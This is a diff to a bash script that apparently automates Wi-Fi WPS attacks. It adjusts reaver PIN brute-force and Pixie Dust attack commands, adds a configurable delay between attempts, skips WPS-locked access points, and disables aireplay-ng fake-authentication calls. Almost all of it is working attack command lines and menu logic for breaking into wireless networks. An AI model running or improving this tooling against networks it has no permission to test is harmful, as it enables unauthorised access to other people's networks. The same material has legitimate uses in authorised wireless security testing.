@@ -156,8 +156,17 @@ function scan_wash
 		then
 			SCW=0
 			break
-		else
-			WASHSCAN2=${nnum[$WASHSCAN]}
+		elif [[ "$WASHSCAN" -ge 1 ]]
+		then
+			WASHSCAN2="${nnum[$WASHSCAN]}"
+			if [[ ! "${alock[WASHSCAN2]}" = "No" ]]
+			then
+				clear
+				echo -e ""$RS"This AP is locked"$CE""
+				sleep 3
+				SCW=0
+				continue
+			fi
 			BSSIDT="${abssid[$WASHSCAN2]}"
 			CHANT="${achannel[$WASHSCAN2]}"
 			ESSIDT="${aessid[$WASHSCAN2]}"
@@ -191,7 +200,7 @@ function scan_wash
 				elif [[ "$WPSL" = "3" ]]
 				then
 					bully_script
-				fi
+				fi		
 			done
 			if [[ "$RESCAN" = 1 ]]
 			then
@@ -200,28 +209,42 @@ function scan_wash
 			else
 				break
 			fi
+		else
+			SCW=0
 		fi
 	done
 }
 function reaver_attack
 {
 	clear
-	xterm -geometry 90x70+0+0 -e "sleep 5 && aireplay-ng $WLANNM -1 120 -a $BSSIDT" & disown
-	reaver -i $WLANNM -b $BSSIDT -c $CHANT -v -N -A | tee /root/lscript/wpslog
+	TERMINALTITLE="WPS BRUTEFORCE"
+	dash_calc
+	printf '\033]2;WPS BRUTEFORCE\a'
+	echo -e "Delay between every attempt("$YS"Enter"$CE"=60): "
+	read DELAY
+	if [[ "$DELAY" = "" ]]
+	then
+		DELAY=60
+	fi
+	#xterm -geometry 90x70+0+0 -e "sleep 5 && aireplay-ng $WLANNM -1 120 -a $BSSIDT" & disown
+	reaver -i $WLANNM -b $BSSIDT -c $CHANT -d $DELAY -L -f -N -vvv | tee /root/lscript/wpslog
 	echo -e "Press "$YS"enter"$CE" to go back"
 	read	
 }
 function pixie_attack
 {
 	clear
-	xterm -geometry 90x70+0+0 -e "sleep 5 && aireplay-ng $WLANNM -1 10 -a $BSSIDT" & disown
-	reaver -i $WLANNM -b $BSSIDT -c $CHANT -K 1 -S -N -A -vvv | tee /root/lscript/wpslog
+	TERMINALTITLE="PIXIE DUST ATTACK"
+	dash_calc
+	printf '\033]2;PIXIE DUST ATTACK\a'
+	#xterm -geometry 90x70+0+0 -e "aireplay-ng $WLANNM -1 10 -a $BSSIDT" & disown
+	reaver -i $WLANNM -b $BSSIDT -c $CHANT -K 1 -S -N -vvv | tee /root/lscript/wpslog
 	echo -e "Press "$YS"enter"$CE" to go back"
 	read
 }
 function reaver_wpastart
 {
-	reaver -i $WLANNM -b $BSSIDT -c $CHANT -p $WPST -vv
+	reaver -i $WLANNM -b $BSSIDT -c $CHANT -p $WPST -L -f -N -g 1 -d 2 -vvv
 	echo -e "$PAKTC"
 	read
 }
@@ -253,7 +276,7 @@ do
 	achannel[$nnn]=$(cat $file | awk -v nn="$nnn" '{if(NR==nn)print $2}')
 	aessid[$nnn]=$(cat $file | awk -v nn="$nnn" '{if(NR==nn)print $6}')
 	alock[$nnn]=$(cat $file | awk -v nn="$nnn" '{if(NR==nn)print $5}')
-	if [[ $alock[$nnn] = "No" ]]
+	if [[ ! ${alock[$nnn]} = "No" ]]
 	then
 		locked="$RS"
 	else
@@ -281,6 +304,8 @@ done
 }
 function bully_script
 {
+TERMINALTITLE="BULLY AUTOMATION"
+dash_calc
 printf '\033]2;BULLY AUTOMATION\a'
 while true
 do
@@ -470,9 +495,9 @@ function main_wps_options
 while true
 do
 clear
-TERMINALTITLE="WPS PIN"
+TERMINALTITLE="WPS MENU"
 dash_calc
-printf '\033]2;WPS PIN\a'
+printf '\033]2;WPS MENU\a'
 if [[ "$ESSIDT" = "" ]]
 then
 	echo -e ""$YS" 1"$CE") Scan with wash         Selected: "$RS"None"$CE""
